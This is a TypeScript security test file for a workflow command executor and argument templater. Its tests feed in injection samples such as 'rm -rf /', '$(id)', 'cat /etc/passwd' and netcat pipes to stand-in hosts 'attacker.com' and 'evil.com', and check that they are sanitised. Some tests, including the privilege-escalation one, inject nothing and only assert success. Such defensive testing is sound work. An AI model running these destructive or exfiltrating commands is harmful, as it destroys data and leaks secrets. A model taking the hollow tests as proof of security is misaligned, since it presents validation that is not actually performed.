/**
 * Security integration tests
 * Cross-component security validation
 */

import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { StateMachine } from '../../../src/workflow/fsm';
import { WorkflowParser } from '../../../src/workflow/parser';
import { CommandExecutor } from '../../../src/workflow/executor';
import { ConfirmationHandler } from '../../../src/workflow/confirmation-handler';
import { ArgumentTemplater } from '../../../src/workflow/argument-templater';
import { Logger } from '../../../src/utils/logger';
import { createTempDir, cleanupTempDir, createWorkflowFile } from '../helpers/test-utils';

describe('Security Integration Tests', () => {
  const logger = new Logger(true); // Silent mode for tests
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir();
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  describe('Command Injection Prevention', () => {
    test('should prevent command injection through workflow args', async () => {
      const workflowContent = `
workflows:
  injection-test:
    name: "Injection Test"
    description: "Test command injection prevention"
    initialState: "start"
    states:
      start:
        command: "echo"
        args: ["test; rm -rf /"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['injection-test'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      const result = await fsm.execute();

      // Should execute successfully but only echo the string, not execute the rm command
      expect(result.success).toBe(true);
    });

    test('should prevent shell injection through template variables', async () => {
      // Test template sanitization directly
      const templater = new ArgumentTemplater(logger);
      const maliciousValue = templater.substituteTemplate(
        'User: {username}',
        { username: 'test; rm -rf /' }
      );

      // Template system should sanitize or escape the value
      expect(maliciousValue).not.toContain('rm -rf');
    });

    test('should prevent injection through confirmation messages', async () => {
      const workflowContent = `
workflows:
  confirm-injection:
    name: "Confirmation Injection"
    description: "Test confirmation injection prevention"
    initialState: "start"
    states:
      start:
        command: "echo"
        args: ["Test"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['confirm-injection'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      // Execute with --yes to skip actual confirmation
      const result = await fsm.execute({ yesFlag: true });

      // Should complete without executing injected commands
      expect(result.success).toBe(true);
    });
  });

  describe('Path Traversal Protection', () => {
    test('should allow legitimate relative paths', async () => {
      const workflowContent = `
workflows:
  path-test:
    name: "Path Test"
    description: "Test legitimate path handling"
    initialState: "start"
    states:
      start:
        command: "echo"
        args: ["../../shared/config"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['path-test'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      const result = await fsm.execute();

      // Legitimate development paths should work
      expect(result.success).toBe(true);
    });

    test('should handle node_modules bin paths', async () => {
      const workflowContent = `
workflows:
  bin-path:
    name: "Bin Path Test"
    description: "Test node_modules bin paths"
    initialState: "start"
    states:
      start:
        command: "echo"
        args: ["../node_modules/.bin/eslint"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['bin-path'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      const result = await fsm.execute();

      // Node modules paths should work
      expect(result.success).toBe(true);
    });

    test('should handle build output paths', async () => {
      const workflowContent = `
workflows:
  output-path:
    name: "Output Path Test"
    description: "Test build output paths"
    initialState: "start"
    states:
      start:
        command: "echo"
        args: ["./build/output"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['output-path'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      const result = await fsm.execute();

      expect(result.success).toBe(true);
    });
  });

  describe('Template Variable Security', () => {
    test('should sanitize template variables with special characters', async () => {
      const templater = new ArgumentTemplater(logger);
      
      const maliciousVariables = {
        cmd: '`whoami`',
        subcmd: '$(id)',
        pipe: '| nc attacker.com 4444',
        redirect: '> /etc/passwd'
      };

      const result = templater.substituteTemplate(
        'test {cmd} {subcmd} {pipe} {redirect}',
        maliciousVariables
      );

      // Should not execute shell commands
      expect(result).not.toContain('whoami');
      expect(result).not.toContain('id');
      expect(result).not.toContain('nc');
      expect(result).not.toContain('/etc/passwd');
    });

    test('should handle multiple template variables safely', async () => {
      // Test template sanitization directly
      const templater = new ArgumentTemplater(logger);
      const result = templater.substituteTemplate(
        'Branch: {branch}, Env: {environment}, Ver: {version}',
        {
          branch: 'main; rm -rf /',
          environment: 'prod && cat /etc/passwd',
          version: '1.0.0 | nc evil.com 4444'
        }
      );

      // Should not contain dangerous commands
      expect(result).not.toContain('rm -rf');
      expect(result).not.toContain('cat /etc/passwd');
      expect(result).not.toContain('nc evil.com');
    });
  });

  describe('Timeout Security', () => {
    test('should enforce timeout limits', async () => {
      const workflowContent = `
workflows:
  timeout-test:
    name: "Timeout Test"
    description: "Test timeout enforcement"
    initialState: "start"
    states:
      start:
        command: "sleep"
        args: ["10"]
        timeout: 1000
        transitions:
          timeout: "timeout-handler"
      timeout-handler:
        command: "echo"
        args: ["Timeout handled"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['timeout-test'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      const startTime = Date.now();
      const result = await fsm.execute();
      const duration = Date.now() - startTime;

      // Should timeout and execute timeout handler
      expect(result.success).toBe(true);
      expect(result.finalState).toBe('timeout-handler');
      expect(duration).toBeLessThan(5000); // Should timeout before 10 seconds
    });
  });

  describe('Error Handling Security', () => {
    test('should not leak sensitive information in error messages', async () => {
      const workflowContent = `
workflows:
  error-test:
    name: "Error Test"
    description: "Test error message sanitization"
    initialState: "start"
    states:
      start:
        command: "cat"
        args: ["/home/user/secret/file.txt"]
        transitions:
          failure: "error-handler"
      error-handler:
        command: "echo"
        args: ["Error handled"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['error-test'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      const result = await fsm.execute();

      // Error should be handled without exposing sensitive paths
      expect(result.success).toBe(true);
      expect(result.finalState).toBe('error-handler');
    });
  });

  describe('Cross-Component Security', () => {
    test('should maintain security across FSM, executor, and templater', async () => {
      const workflowContent = `
workflows:
  cross-component:
    name: "Cross Component Security"
    description: "Test security across all components"
    initialState: "template-test"
    states:
      template-test:
        command: "echo"
        args: ["User: test, Branch: main"]
        transitions:
          success: "confirm-test"
      confirm-test:
        command: "echo"
        args: ["Confirmed"]
        transitions:
          success: "execute-test"
      execute-test:
        command: "echo"
        args: ["Executing command"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['cross-component'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      // Execute workflow safely
      const result = await fsm.execute({ yesFlag: true });

      // Should complete safely
      expect(result.success).toBe(true);
      expect(result.stateHistory).toHaveLength(3);
    });

    test('should prevent privilege escalation attempts', async () => {
      const workflowContent = `
workflows:
  privilege-test:
    name: "Privilege Test"
    description: "Test privilege escalation prevention"
    initialState: "start"
    states:
      start:
        command: "echo"
        args: ["Test"]
        transitions: {}

metadata:
  version: "1.0.0"
`;

      createWorkflowFile(tempDir, workflowContent);
      const parser = new WorkflowParser(logger);
      const workflows = parser.loadWorkflows(tempDir);
      const workflow = workflows.workflows['privilege-test'];

      const executor = new CommandExecutor(logger);
      const confirmationHandler = new ConfirmationHandler(executor, logger);
      const fsm = new StateMachine(workflow, logger, executor, confirmationHandler);

      // Commands should run with normal user privileges, not elevated
      const result = await fsm.execute();

      expect(result.success).toBe(true);
    });
  });
});
